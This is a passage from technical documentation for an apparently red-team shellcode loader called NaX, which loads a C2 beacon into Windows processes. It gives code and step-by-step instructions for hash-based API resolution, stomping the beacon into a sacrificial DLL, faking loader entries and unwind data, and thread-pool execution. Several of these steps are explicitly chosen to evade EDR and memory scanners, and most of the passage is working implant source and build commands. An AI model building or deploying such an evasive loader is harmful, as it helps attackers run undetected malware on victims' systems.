     - Yes: call LdrpFwdResolve() to follow the forwarding chain
     - No:  return the address directly
```

### Forwarded Exports

Windows DLLs frequently forward exports to other DLLs. For example, `kernel32!VirtualAlloc` may forward to `KERNELBASE!VirtualAlloc`. If the resolved address falls within the export directory's address range, it points to a forwarding string like `"KERNELBASE.VirtualAlloc"`.

`LdrpFwdResolve()` handles this:

1. Split the forwarding string at the `.` separator
2. Build a wide-string DLL name (`KERNELBASE.dll`)
3. Hash it and call `LdrModulePeb()` to find the target module
4. Recurse into `LdrFunction()` with the target module and function name hash

Ordinal forwarding (`"Module.#42"`) is not implemented - returns NULL.

### Compile-Time Hashing

The hash function is FNV1a (seed 0x811c9dc5, prime 0x01000193), case-insensitive (uppercased before hashing). The compile-time version in `Constexpr.h` is evaluated at compile time when used with string literals:

```c
#define HASH_STR( x ) ExprHashStringA( ( x ) )

CONSTEXPR ULONG ExprHashStringA( PCHAR String ) {
    ULONG Hash = H_MAGIC_KEY;   // 0x811c9dc5
    CHAR  Char = { 0 };

    while ( ( Char = *String++ ) ) {
        if ( Char >= 'a' ) Char -= 0x20;
        Hash ^= (UCHAR)Char;
        Hash *= H_MAGIC_PRIME;  // 0x01000193
    }
    return Hash;
}
```

The C files are compiled as C++ (`x86_64-w64-mingw32-g++`) specifically to enable `constexpr` evaluation. This means `HASH_STR("VirtualProtect")` becomes a constant `0x...` in the compiled binary - no API name strings appear anywhere in the shellcode.

The runtime `HashString()` in `Utils.c` uses the same FNV1a algorithm but also handles wide strings (when `Length > 0`, it iterates byte-by-byte including null bytes between WCHAR halves - this matches how PEB module names are stored as `UNICODE_STRING`).

### D_API / RESOLVE Macros

Adding a new API to the loader requires two steps:

1. **Declare** in the INSTANCE struct:
   ```c
   D_API( NewFunction );   // expands to: __typeof__(NewFunction) * NewFunction;
   ```

2. **Resolve** in Main.c:
   ```c
   RESOLVE( NewFunction, Kernel32 );
   // expands to:
   // API(NewFunction) = (__typeof__(NewFunction)*)LdrFunction(MOD(Kernel32), HASH_STR("NewFunction"))
   ```

The convenience macros:

```c
#define MOD( x )          Instance()->Modules.x
#define API( x )          Instance()->Win32.x
#define RESOLVE( x, y )   ( API(x) = (__typeof__(x)*)LdrFunction( MOD(y), HASH_STR(#x) ) )
```

## NaxHeader v2

### Header Layout

The NaxHeader sits between the loader shellcode and the beacon bytes in the combined binary. It is 160 bytes, accessed via pointer arithmetic (no struct, because PIC code should avoid struct layout assumptions across compilation units).

```
Offset  Size   Field           Description
------  -----  --------------  -------------------------------------------
0x00    4      Magic           0x4E415832 ("NAX2")
0x04    4      BeaconSize      Beacon .text size in bytes
0x08    4      PdataSize       .pdata section size (0 = none)
0x0C    4      XdataSize       .xdata section size (0 = none)
0x10    4      OrigTextRva     Beacon's original .text RVA (for unwind fixup)
0x14    4      Flags           Bitfield: 0x01 = MODULE_STOMP, 0x02 = STOMP_PDATA
0x18    128    StompDll        WCHAR[64], NUL-terminated, zero-padded
0x98    8      Reserved        Must be zero
------  -----  ----------      -------------------------------------------
Total:  160 bytes (0xA0)
```

Access macros:

```c
#define HDR_U32( h, off )   C_DEF32( C_PTR( U_PTR(h) + (off) ) )
#define HDR_WSTR( h, off )  W_PTR( U_PTR(h) + (off) )
```

Field offset constants from `Defs.h`:

```c
#define NAX_HDR_OFF_MAGIC       0
#define NAX_HDR_OFF_BEACON_SZ   4
#define NAX_HDR_OFF_PDATA_SZ    8
#define NAX_HDR_OFF_XDATA_SZ    12
#define NAX_HDR_OFF_TEXT_RVA    16
#define NAX_HDR_OFF_FLAGS       20
#define NAX_HDR_OFF_DLL_NAME   24
#define NAX_HDR_OFF_RESERVED   152
```

### Locating the Header

The header starts immediately after the loader's `.text` section:

```c
#define LOADER_END()  C_PTR( U_PTR(Instance()->Base.Buffer) + Instance()->Base.Length )
```

`Base.Buffer` = `StRipStart()` (loader base), `Base.Length` = `StRipEnd() - StRipStart()` (loader size). So `LOADER_END()` = `StRipEnd()` = one byte past the loader = first byte of the NaxHeader.

### v1 Fallback

If the first 4 bytes at `LOADER_END()` do not match `NAX_HDR_MAGIC`, the loader treats them as a legacy v1 header: a single `UINT32` containing the beacon size, followed immediately by the beacon bytes. This allows the loader to work with both old and new beacon packing formats.

```c
if ( magic != NAX_HDR_MAGIC ) {
    beacon_size = magic;                        // reinterpret as size
    beacon_src  = C_PTR( U_PTR(hdr) + 4 );     // beacon starts after 4-byte header
    // ... allocate + execute (no stomp, no pdata)
}
```

## Technique Dispatch

### VirtualAlloc Path

When `NAX_STOMP_MODE=0` (compile-time), the loader uses `NtAllocateVirtualMemory` to allocate private memory:

```c
FUNC PVOID NaxAllocExec( PVOID BeaconSrc, ULONG BeaconSize ) {
    STARDUST_INSTANCE

    PVOID  exec_buf  = NULL;
    SIZE_T copy_size = ((SIZE_T)BeaconSize + 0xFFFu) & ~(SIZE_T)0xFFFu;  // page-align
    ULONG  old_prot  = 0;

    // 1. Allocate RW pages
    NtAllocateVirtualMemory( NtCurrentProcess(), &exec_buf, 0,
                             &copy_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    // 2. Copy beacon
    MmCopy( exec_buf, BeaconSrc, BeaconSize );

    // 3. Flip to RX
    VirtualProtect( exec_buf, copy_size, PAGE_EXECUTE_READ, &old_prot );

    return exec_buf;
}
```

This is the simplest path - good for development and testing. The allocated memory is private (PRV type, backed by pagefile), which EDRs flag as suspicious.

### Module Stomp Path

When `NAX_STOMP_MODE=1` (default), the loader stomps the beacon into a sacrificial DLL's `.text` section:

```
NaxModuleStomp flow:
  1. LoadLibraryExW(DllName, NULL, DONT_RESOLVE_DLL_REFERENCES)
     - Loads the DLL without calling DllMain or resolving imports
  2. NaxPatchLdr(DllBase)
     - Walk PEB LDR list, find the new module entry
     - Set EntryPoint, add LDRP_IMAGE_DLL | LDRP_ENTRY_PROCESSED flags
     - Makes the module look like a normally loaded DLL
  3. NaxPeHeaders(DllBase) + NaxFindSection(Nt, CODE | EXECUTE)
     - Parse the DLL's PE headers, find its .text section
     - Verify .text is large enough: SizeOfRawData >= BeaconSize
  4. VirtualProtect(.text, PAGE_READWRITE)
  5. MmCopy(TextBase, BeaconSrc, BeaconSize)
  6. VirtualProtect(.text, PAGE_EXECUTE_READ)
  7. (Optional) Stomp .pdata/.xdata for clean stack walks
  8. Return TextBase as the beacon entry point
```

The beacon now runs from image-backed (IMG) memory. Memory scanners see a loaded DLL with executable code, not a suspicious private allocation.

See the [Module Stomping](Module-Stomping) page for DLL selection guidance and advanced configuration.

### Execution Transfer

After the beacon is placed in its final memory location, the loader starts execution on a new thread.

**Thread Pool (NAX_EXEC_MODE=1, default):**

```c
FUNC VOID NaxExecThreadPool( PVOID Entry ) {
    STARDUST_INSTANCE

    PTP_WORK Work = NULL;
    TpAllocWork( &Work, (PTP_WORK_CALLBACK)Entry, NULL, NULL );
    TpPostWork( Work );
    TpReleaseWork( Work );
}
```

The beacon runs as a thread pool work item. The worker thread's start address is `ntdll!TppWorkerThread`, not the beacon entry point - this is much harder for EDRs to flag via thread start-address scanning.

**CreateThread (NAX_EXEC_MODE=0, fallback):**

```c
FUNC VOID NaxExecThread( PVOID Entry ) {
    STARDUST_INSTANCE
    CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)Entry, NULL, 0, NULL );
}
```

Clean stack (`RtlUserThreadStart` -> `BaseThreadInitThunk` -> beacon), but the thread start address points directly at the beacon - visible to any thread enumeration.

Both paths have a direct-call fallback: if the thread/work allocation fails, the loader calls the beacon entry directly on the current thread.

## Build System

### Toolchain

| Tool | Purpose |
|------|---------|
| `x86_64-w64-mingw32-g++` | Cross-compile C as C++ (enables `constexpr` hashing) |
| `nasm` | Assemble Entry.asm (NASM syntax, `win64` output format) |
| `objcopy` | Extract `.text` section from the linked PE |

### Compiler Flags

```makefile
CFLAGS := -Os                              # Optimize for size
         -fno-asynchronous-unwind-tables   # No .eh_frame (we provide our own .pdata)
         -nostdlib                          # No C runtime
         -fno-ident                         # No compiler ident strings
         -fpack-struct=8                    # Match Win64 struct packing
         -falign-functions=1               # No inter-function padding
         -s                                 # Strip symbols
         -ffunction-sections               # Each function in its own section
         -falign-jumps=1 -falign-labels=1  # No jump/label padding
         -fPIC                              # Position-independent code
         -Wl,-s,--no-seh,--enable-stdcall-fixup
         -Iinclude                          # Header search path
         -masm=intel                        # Intel assembly syntax in inline asm
         -fpermissive                       # Allow C++ type coercions
         -mno-sse                           # No SSE instructions (avoid xmm alignment issues)
         -fno-exceptions                    # No C++ exception handling
         -fno-builtin                       # No built-in function substitutions
         -DNAX_STOMP_MODE=$(NAX_STOMP_MODE) # Technique selection
         -DNAX_EXEC_MODE=$(NAX_EXEC_MODE)
```

Key flags to understand:
- `-nostdlib` prevents any CRT startup code from being linked in
- `-fno-asynchronous-unwind-tables` prevents `.eh_frame` generation (which would be a second section)
- `-falign-functions=1` eliminates NOP padding between functions that would waste space
- `-fno-builtin` prevents the compiler from replacing `memcpy` patterns with CRT calls
- `-masm=intel` is critical: without it, inline assembly uses AT&T syntax and operand order is reversed

### Build Pipeline

```
1. NASM compiles Stardust.asm -> asm_Stardust.x64.o
   (produces .text$A and .text$E object sections)

2. g++ compiles each .c file -> nax_*.x64.o
   (each function lands in .text$B via the FUNC attribute)

3. g++ links all objects with -Tscripts/Linker.ld -> nax_loader.x64.exe
   (Linker.ld merges everything into a single .text section, ordered A/B/rdata/data/E)

4. objcopy --dump-section .text=nax_loader.x64.bin nax_loader.x64.exe
   (extracts the raw .text bytes - this is the loader shellcode)
```

The final `nax_loader.x64.bin` is pure position-independent shellcode: just the `.text` bytes, no PE headers, no imports, no relocations.

### Packing (pack_nax.py)

The top-level `scripts/pack_nax.py` combines the loader with the beacon:

```
python3 pack_nax.py \
    --loader  src_loader/bin/nax_loader.x64.bin \
    --beacon  src_beacon/build/http/beacon.x64.bin \
    --pdata   src_beacon/build/http/beacon.pdata.bin \
    --xdata   src_beacon/build/http/beacon.xdata.bin \
    --text-rva src_beacon/build/http/beacon.text_rva \
    --stomp-dll chakra.dll \
    --module-stomp --stomp-pdata \
    --output build/nax.x64.bin
```

The script:
1. Reads all binary components
2. Normalizes `.pdata` RUNTIME_FUNCTION entries to 0-based offsets (subtracts the beacon's `.text` RVA from BeginAddress/EndAddress and `.xdata` RVA from UnwindData)
3. Builds an Entry.asm RUNTIME_FUNCTION + UNWIND_INFO and prepends it to pdata/xdata
4. Constructs the 160-byte NaxHeader v2
5. Concatenates: `loader + header + beacon + pdata + xdata`
6. Writes the combined binary

The normalization step is important: the beacon's `.pdata` references are compiled with absolute RVAs from the beacon PE, but after stomping they need to reference the DLL's address space. The loader's `NaxModuleStomp` adds the DLL's `.text` RVA and `.pdata` RVA at runtime.

## Writing Your Own Loader from Scratch

This section walks through building a Stardust-based UDRL from zero that can load the NaX beacon. Each step corresponds to a ZPS course concept. Start simple, get each stage working, then add complexity.

### Step 1: Assembly Entry Point

Create your NASM entry file. This is the minimum:

```nasm
[BITS 64]
DEFAULT REL

EXTERN PreMain
GLOBAL Start
GLOBAL StRipStart
GLOBAL StRipEnd

[SECTION .text$A]

    Start:
        push  rsi
        mov   rsi, rsp
        and   rsp, 0FFFFFFFFFFFFFFF0h
        sub   rsp, 020h
        call  PreMain
        mov   rsp, rsi
        pop   rsi
        ret

    StRipStart:
        call  .rip_ptr
        ret
    .rip_ptr:
        mov   rax, [rsp]
        sub   rax, 0x1b     ; offset from Start to this return address
        ret

[SECTION .text$E]

    StRipEnd:
        call  .end_ptr
        ret
    .end_ptr:
        mov   rax, [rsp]
        add   rax, 0x0b     ; size of this section from return addr to end
        ret
        nop                  ; pad to 16 bytes (prevents alignment gap)
```

The `0x1b` and `0x0b` constants are byte-counted from the assembled instructions. If you change the entry stub code, you must recalculate these offsets. Get this wrong and the loader will compute the wrong base address or wrong end address, causing the header parse to read garbage.

Verify with: assemble, disassemble, count bytes from `Start` to the `call .rip_ptr` return address.

### Step 2: PEB Walk and Module Resolution

Before you can call any Win32 API, you need to find the DLLs in memory. Every Windows process has ntdll.dll and kernel32.dll loaded. The PEB's `Ldr->InLoadOrderModuleList` is a doubly-linked list of `LDR_DATA_TABLE_ENTRY` structs.

Write `LdrModulePeb`:

```c
FUNC PVOID LdrModulePeb( ULONG Hash ) {
    PLDR_DATA_TABLE_ENTRY Data  = { 0 };
    PLIST_ENTRY           Head  = &NtCurrentPeb()->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY           Entry = Head->Flink;

    for ( ; Head != Entry; Entry = Entry->Flink ) {
        Data = C_PTR( Entry );
        if ( HashString( Data->BaseDllName.Buffer, Data->BaseDllName.Length ) == Hash )
            return Data->DllBase;
    }
    return NULL;
}
```

You will also need `HashString` - the runtime hashing function. NaX uses FNV1a with seed 0x811c9dc5 and prime 0x01000193, case-insensitive. The wide-string mode (when `Length > 0`) iterates byte-by-byte through the `UNICODE_STRING` buffer, including the null bytes between WCHAR halves.

Compute your module hashes in Python:

```python
def fnv1a_hash(s, wide=False):
    h = 0x811c9dc5
    if wide:
        data = s.encode('utf-16-le')
    else:
        data = s.upper().encode('ascii')
    i = 0
    while i < len(data):
        c = data[i]
        if wide and c == 0:
            h = (h * 0x01000193) & 0xFFFFFFFF
            i += 2  # skip null + advance
            continue
        if c >= ord('a'):
            c -= 0x20
        h ^= c
        h = (h * 0x01000193) & 0xFFFFFFFF
        i += 1
    return h

# Module hashes (wide string)
print(hex(fnv1a_hash("ntdll.dll", wide=True)))      # 0x318a7963
print(hex(fnv1a_hash("kernel32.dll", wide=True)))    # 0x04a1a06a
```

### Step 3: TLS Egghunter for Global State

Allocate consecutive TLS slots and store the INSTANCE pointer:

1. Call `TlsAlloc()` in a loop (up to ~20 times)
2. Check if the current slot index equals the previous slot index + 1
3. When a consecutive pair is found, store `NtCurrentPeb()` in slot N and the INSTANCE pointer in slot N+1
4. Free all non-consecutive slots you allocated during the search

This is the most error-prone part of the loader. Common mistakes:

- Forgetting to free non-consecutive slots (TLS slot leak)
- Not handling `TLS_OUT_OF_INDEXES` (all 64 static slots in use)
- Assuming slots start at 0 (they start at whatever Windows gives you)
- Searching past slot 63 in the retrieval code (TlsSlots array is 64 entries, indices 0-63)

### Step 4: Build the INSTANCE Struct

Define your INSTANCE with `D_API` for every API you will resolve:

```c
#define D_API( x )  __typeof__( x ) * x;

typedef struct _INSTANCE {
    BUFFER Base;

    struct {
        D_API( RtlAllocateHeap )
        D_API( VirtualProtect )
        // ... add more as needed
    } Win32;

    struct {
        PVOID Ntdll;
        PVOID Kernel32;
    } Modules;
} INSTANCE;
```

Keep it minimal at first. Only add APIs you actually need for the current step.

### Step 5: Export Table Walk with Forwarding

`LdrFunction` walks a module's PE export directory:

```
1. Validate DOS + NT signature
2. Find IMAGE_EXPORT_DIRECTORY from DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
3. Iterate AddressOfNames[0..NumberOfNames]:
   a. Hash the name, compare to target
   b. On match: ordinal = AddressOfNameOrdinals[i]
                address = base + AddressOfFunctions[ordinal]
4. Check if address falls inside the export directory (forwarded export)
   - Yes: parse "MODULE.Function" string, resolve recursively
   - No:  return address
```

Forwarded export handling is non-optional. `VirtualAlloc` in kernel32.dll forwards to `KERNELBASE.VirtualAlloc` on modern Windows. If your loader does not handle forwarding, API resolution will return a pointer to the forwarding string instead of the actual function - calling it will crash.

The forwarding resolution in NaX (`LdrpFwdResolve`):

1. Find the `.` in `"KERNELBASE.VirtualAlloc"`
2. Build wide string `L"KERNELBASE.dll"`
3. `LdrModulePeb(hash_of_wide_string)` to find the target module
4. `LdrFunction(target_module, hash_of_function_name)` to resolve the function

### Step 6: Parse NaxHeader v2

After resolving APIs, locate the header and extract fields:

```c
PVOID hdr = LOADER_END();    // = Base.Buffer + Base.Length

ULONG magic       = HDR_U32( hdr, 0  );    // should be 0x4E415832
ULONG beacon_size = HDR_U32( hdr, 4  );
ULONG pdata_size  = HDR_U32( hdr, 8  );
ULONG xdata_size  = HDR_U32( hdr, 12 );
ULONG text_rva    = HDR_U32( hdr, 16 );
ULONG flags       = HDR_U32( hdr, 20 );
PWCHAR dll_name   = HDR_WSTR( hdr, 24 );

PVOID beacon_src  = C_PTR( U_PTR(hdr) + 160 );  // NAX_HDR_SIZE
PVOID pdata_src   = C_PTR( U_PTR(beacon_src) + beacon_size );
PVOID xdata_src   = C_PTR( U_PTR(pdata_src) + pdata_size );
```

Always validate:
- `magic == 0x4E415832` (or handle v1 fallback)
- `beacon_size > 0 && beacon_size <= 512 * 1024` (sanity bound)

### Step 7: VirtualAlloc Execution (Simplest Path)

Start with the simplest allocation strategy. Get this working before attempting module stomping.

```c
// 1. Allocate RW pages (page-aligned size)
SIZE_T alloc_size = (beacon_size + 0xFFF) & ~(SIZE_T)0xFFF;
PVOID  exec_buf   = NULL;
NtAllocateVirtualMemory( NtCurrentProcess(), &exec_buf, 0,
                         &alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

// 2. Copy beacon bytes
MmCopy( exec_buf, beacon_src, beacon_size );

// 3. Flip to RX
ULONG old_prot = 0;
VirtualProtect( exec_buf, alloc_size, PAGE_EXECUTE_READ, &old_prot );

// 4. Execute
((VOID (*)(VOID))exec_buf)();
```

The RW-then-RX pattern avoids having executable+writable pages at any point - important for CIG (Code Integrity Guard) compatible processes, and a generally good practice.

### Step 8: Module Stomping

Once VirtualAlloc works, upgrade to module stomping:

1. Choose a sacrificial DLL with a large `.text` section (the default is `chakra.dll`)
2. Load it with `DONT_RESOLVE_DLL_REFERENCES` - this prevents DllMain from running and avoids resolving the DLL's own imports
3. Parse the loaded DLL's PE headers, find its `.text` section
4. Verify `.text` is large enough for the beacon
5. `VirtualProtect` the `.text` to RW, copy beacon, flip back to RX
6. Patch the LDR entry to look like a normally loaded DLL

```c
// Load without initialization
PVOID DllBase = LoadLibraryExW( dll_name, NULL, DONT_RESOLVE_DLL_REFERENCES );

// Find .text section
PIMAGE_NT_HEADERS Nt = NaxPeHeaders( DllBase );
PIMAGE_SECTION_HEADER TextSec = NaxFindSection( Nt, IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE );

// Verify size
if ( TextSec->SizeOfRawData < beacon_size ) return NULL;  // DLL too small

PVOID TextBase = (PVOID)( (ULONG_PTR)DllBase + TextSec->VirtualAddress );

// Stomp
VirtualProtect( TextBase, TextSec->SizeOfRawData, PAGE_READWRITE, &old );
MmCopy( TextBase, beacon_src, beacon_size );
VirtualProtect( TextBase, TextSec->SizeOfRawData, PAGE_EXECUTE_READ, &old );
```

Do not skip `NaxPatchLdr`. Without it, the DLL's LDR entry will have a NULL `EntryPoint` and will not have the `LDRP_ENTRY_PROCESSED` flag. Some EDR modules and the Windows loader itself check these fields - a loaded DLL without `LDRP_ENTRY_PROCESSED` is suspicious.

### Step 9: .pdata/.xdata Unwind Stomping

On x64 Windows, structured exception handling and stack unwinding rely on `.pdata` (RUNTIME_FUNCTION entries) and `.xdata` (UNWIND_INFO structures). If your beacon has proper unwind data but runs in a DLL whose `.pdata` describes different functions, stack walks will produce nonsensical results - a detection signal.

The fix: stomp the DLL's `.pdata` section with the beacon's unwind data, adjusting RVAs to match the DLL's address space.

```
For each RUNTIME_FUNCTION entry:
  BeginAddress += DllTextRva      (beacon offset -> DLL .text RVA)
  EndAddress   += DllTextRva
  UnwindData   += PdataRva + PdataSize  (beacon xdata offset -> DLL .pdata offset)
```

Then update the PE header's `DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]` to point to the new `.pdata` location and size.

The `pack_nax.py` script normalizes all addresses to 0-based offsets at pack time. The loader adds the DLL's RVAs at runtime. This separation means the same packed binary works with any sacrificial DLL.

### Step 10: Thread Pool Execution Transfer

Replace the direct `((VOID(*)(VOID))entry)()` call with a thread pool work item:

```c
PTP_WORK Work = NULL;
TpAllocWork( &Work, (PTP_WORK_CALLBACK)entry, NULL, NULL );
TpPostWork( Work );
TpReleaseWork( Work );
```

The beacon runs on a thread pool worker thread. Its start address (visible in `NtQueryInformationThread`) is `ntdll!TppWorkerThread` - a completely normal start address for any process that uses the Windows thread pool.

Note: `TpAllocWork`, `TpPostWork`, and `TpReleaseWork` are ntdll functions, not kernel32. Resolve them from ntdll.

### Step 11: Remove Build Padding

The stock Stardust `build.py` pads the extracted shellcode to page alignment:

```python
# build.py (stock Stardust)
pages   = size_to_pages(size)
padding = (pages * PAGE_SIZE) - size
for i in range(padding):
    shellcode.append(0)
```

NaX does **not** use `build.py`. Instead it uses `objcopy --dump-section .text` which extracts the exact `.text` bytes with no padding. This is critical because the NaxHeader must start immediately after the loader bytes - any padding between the loader and header will cause the header magic check to fail.

If you are adapting stock Stardust, you have two options:

1. **Use `pack_nax.py`** (recommended) - it automatically strips page-padding from any loader before packing. Use `--legacy` for stock Stardust (v1 format with 4-byte beacon_size header) or omit it for the full NaxHeader v2 format:
   ```bash
   # Stock Stardust loader (v1 format)
   python3 scripts/pack_nax.py --loader stardust.x64.bin --beacon beacon.x64.bin --output out.bin --legacy

   # NaX loader (v2 format with module stomping)
   python3 scripts/pack_nax.py --loader nax_loader.x64.bin --beacon beacon.x64.bin --output out.bin --module-stomp
   ```

2. **Edit `build.py`** - comment out the page-alignment padding. The `ALIGN(0x1000)` directive in `Linker.ld` pads between internal sections, not at the end, so removing the Python-side padding is safe.

You must also fix `Main.c` to use `Instance()->Base.Buffer + Instance()->Base.Length` instead of calling `StRipEnd()` directly - see the [stock Stardust PoC](#using-stock-stardust-as-a-loader-minimal-poc) section for the full explanation.

## PIC Rules Reference

These rules apply to both the loader and the beacon. Violating any of them will produce a binary that crashes or contains detectable artifacts.

| Rule | Rationale |
|------|-----------|
| No string literals | String literals go in `.rdata`, which is a separate section that gets stripped. Use `char` arrays initialized on the stack or byte-by-byte `MOV` macros. |
| No CRT calls | `memcpy`, `strlen`, `printf` all require the C runtime, which is not linked. Use `MmCopy` (`__builtin_memcpy`), `MmSet` (`__stosb`), `MmZero` (`RtlSecureZeroMemory`). |
| No global variables | Global variables go in `.data` or `.bss`. All state goes through the INSTANCE struct. |
| All APIs via function pointers | No `__declspec(dllimport)`. Every Win32 call goes through a resolved pointer in `Instance()->Win32`. |
| No SSE instructions | SSE requires 16-byte aligned stack which may not be guaranteed in all execution contexts. Compile with `-mno-sse`. |
| No exceptions | C++ exception tables go in `.xdata`/`.pdata` sections. Compile with `-fno-exceptions`. |
| `make clean && make` after header changes | The `-MMD -MP` flags generate dependency files, but changes to conditional compilation defines (like `NAX_STOMP_MODE`) are not tracked. Always clean-build after changing defines or headers. |

## Debugging Tips

**Use the stomper.exe test harness.** It loads `nax.x64.bin` into RWX memory and calls it on a new thread. Attach a debugger before pressing Enter.

```
x64dbg: bp on Start address (offset 0x0 of the loaded shellcode)
WinDbg: .load sos; bp <shellcode_addr>
```

**Common failure points and how to diagnose them:**

| Symptom | Likely Cause | How to Check |
|---------|-------------|--------------|
| Crash in `PreMain` before TLS | PEB walk failed: ntdll or kernel32 not found | Verify hash constants match your hash function. Hash `L"ntdll.dll"` (wide, 18 bytes) and compare to `H_MODULE_NTDLL`. |
| Crash at `RESOLVE(...)` in Main | Forwarded export not handled | Set breakpoint on `LdrFunction`. If it returns an address inside the export directory, forwarding is needed. |
| Beacon reads garbage from header | `StRipEnd()` returning wrong value | Disassemble `.text$E`. Count bytes. Verify the `add rax, 0x0b` matches the actual section size. Also check for page-alignment padding in the extracted blob. |
| Beacon crashes immediately | Wrong `beacon_src` pointer | Print `hdr`, `beacon_src`, verify `HDR_U32(hdr, 0)` == `0x4E415832`. If the magic is wrong, the header is not where the loader thinks it is. |
| Thread pool callback crashes | Entry point not executable | Verify `VirtualProtect` succeeded (check return value). In module stomp mode, verify `TextSec->SizeOfRawData >= BeaconSize`. |
| Stack walks show bad frames | `.pdata` not stomped or RVAs wrong | Check the RUNTIME_FUNCTION entries after stomping. `BeginAddress` should be `DllTextRva + 0`, not the beacon's original `.text` RVA. |

**Print debugging in PIC:** You cannot use `printf`. If you temporarily need debug output, resolve `OutputDebugStringA` from kernel32 and call it with stack-allocated char arrays. Remove before production.

## Test Harnesses

Two test launchers are included in `src_loader/scripts/`:

**loader.c** - The simplest possible launcher. Reads a file into memory, `VirtualAlloc` + `memcpy` + `VirtualProtect(RX)`, then calls the shellcode as a function pointer. Use this to test the raw loader shellcode (`nax_loader.x64.bin`) without the beacon attached.

```bash
x86_64-w64-mingw32-gcc scripts/loader.c -o scripts/loader.x64.exe -lkernel32
# On target:
loader.x64.exe nax_loader.x64.bin
```

**stomper.c** - Loads the combined `nax.x64.bin` (loader + header + beacon), allocates RWX, and creates a thread. Pauses before execution so you can attach a debugger.

```bash
x86_64-w64-mingw32-gcc scripts/stomper.c -o scripts/stomper.exe -lkernel32
# On target:
stomper.exe build\nax.x64.bin
# Attach debugger, press Enter to execute
```

Compile both with MinGW on Linux and transfer to a Windows VM for testing. Use x64dbg or WinDbg for step-through debugging of the loader execution.
